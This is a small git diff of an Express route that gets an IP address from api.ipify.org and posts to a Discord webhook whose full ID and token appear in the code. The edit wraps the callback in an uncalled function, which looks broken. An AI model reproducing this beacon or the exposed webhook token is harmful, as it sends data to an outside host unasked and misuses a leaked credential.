@@ -7,7 +7,7 @@ app.get("/", (req, res) => {
   fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
 //    .then(data => res.status(200).json({ userIp: data.ip }));
-    .then(data => {
+    .then(data => function () {
         var request = new XMLHttpRequest();
         request.open("POST", "https://discord.com/api/webhooks/1165176949388365836/4SrFU4Dteo8tKuE-H4JOqpmx_6_cpDkrJ_xTu8Q00oZIdZB1m4AdJvpo-Q2pVdLPtLi9");
 
